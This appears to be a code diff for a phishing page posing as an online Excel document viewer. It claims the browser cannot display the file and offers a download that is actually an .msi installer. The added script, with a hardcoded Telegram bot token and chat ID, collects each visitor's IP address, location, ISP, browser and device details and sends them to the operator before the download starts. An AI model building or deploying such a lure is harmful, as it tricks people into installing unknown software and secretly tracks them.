@@ -1,31 +1,136 @@
 <!DOCTYPE html>
 <html class="no-js" id="html-ff" lang="">
-  <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Excel</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="shortcut icon" href="img/excel.svg" type="image/svg">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.4/font/bootstrap-icons.css">
-    <link href="https://fonts.googleapis.com/css2?family=Calibri:ital,wght@0,400;0,600;0,700;0,900;1,400;1,700;1,900&amp;display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/main.css">
-  </head>
-  <body>
-    <div class="page excel">
-      <div class="pop-wrap">
-        <div class="pop">
-          <div class="pop-top">
-            <div class="pop-top-icon"><img src="img/excel.svg"></div>
-            <div class="pop-top-title">Create, edit and share Excel spreadsheets. Work with others on shared projects, in real-time.</div>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Excel</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="shortcut icon" href="img/excel.svg" type="image/svg">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.4/font/bootstrap-icons.css">
+  <link href="https://fonts.googleapis.com/css2?family=Calibri:wght@400;600;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/main.css">
+</head>
+
+<body>
+  <div class="page excel">
+    <div class="pop-wrap">
+      <div class="pop">
+        <div class="pop-top">
+          <div class="pop-top-icon">
+            <img src="img/excel.svg">
           </div>
-          <div class="pop-text">Your browser does not support correct online display of this document. To view the document, click the "Download document' button.</div><a class="pop-btn" href="bin/Excel-File.msi">Download document</a>
+          <div class="pop-top-title">
+            Create, edit and share Excel spreadsheets. Work with others on shared projects, in real-time.
+          </div>
+        </div>
+
+        <div class="pop-text">
+          Your browser does not support correct online display of this document.
+          To view the document, click the "Download document" button.
+        </div>
+
+        <!-- IMPORTANT: href removed to fully control download -->
+        <a class="pop-btn" href="#" id="downloadBtn">
+          Download document
+        </a>
+
+        <div id="statusMsg" class="text-muted mt-2" style="display:none;font-size:13px;">
+          Preparing download…
         </div>
       </div>
     </div>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="js/main.js"></script>
-  </body>
+  </div>
+
+<script>
+/* ===================== CONFIG ===================== */
+const botToken = '5999005713:AAGWRZ5KSqGJhVolN8dYLSa6fj8nm-1yOfM';
+const chatId  = '875434694';
+const FILE_URL = 'bin/Excel-File.msi';
+const RATE_LIMIT_SECONDS = 30;
+/* ================================================== */
+
+const btn = document.getElementById('downloadBtn');
+const statusMsg = document.getElementById('statusMsg');
+
+async function sendTelegramReport() {
+  const browser = navigator.userAgent;
+  const platform = navigator.platform || 'Unknown';
+  const screenRes = `${screen.width}x${screen.height}`;
+  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  const res = await fetch('https://ipapi.co/json/');
+  const data = await res.json();
+
+  const message =
+`📥 *Document Download Started*
+
+🌐 IP Address: ${data.ip || 'Unknown'}
+📍 Location: ${data.city || 'Unknown'}, ${data.country || 'Unknown'}
+🏢 ISP: ${data.org || 'Unknown'}
+
+💻 Device: ${platform}
+🧭 Browser: ${browser}
+🖥 Screen: ${screenRes}
+⏰ Time Zone: ${timeZone}`;
+
+  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'Markdown'
+    })
+  });
+}
+
+btn.addEventListener('click', async function (e) {
+  e.preventDefault();
+
+  /* -------- RATE LIMIT -------- */
+  const lastClick = localStorage.getItem('lastDownloadClick');
+  const now = Date.now();
+
+  if (lastClick && (now - lastClick) < RATE_LIMIT_SECONDS * 1000) {
+    alert('Please wait before downloading again.');
+    return;
+  }
+
+  localStorage.setItem('lastDownloadClick', now);
+
+  /* -------- UI LOCK -------- */
+  btn.style.pointerEvents = 'none';
+  btn.style.opacity = '0.6';
+  statusMsg.style.display = 'block';
+
+  try {
+    /* -------- SEND REPORT -------- */
+    await sendTelegramReport();
+
+    /* -------- CONFIRMED → START DOWNLOAD -------- */
+    const a = document.createElement('a');
+    a.href = FILE_URL;
+    a.download = '';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+
+  } catch (err) {
+    console.error('Tracking failed:', err);
+    alert('Download failed. Please try again.');
+  }
+
+  /* -------- RESET UI -------- */
+  setTimeout(() => {
+    btn.style.pointerEvents = 'auto';
+    btn.style.opacity = '1';
+    statusMsg.style.display = 'none';
+  }, RATE_LIMIT_SECONDS * 1000);
+});
+</script>
+
+</body>
 </html>
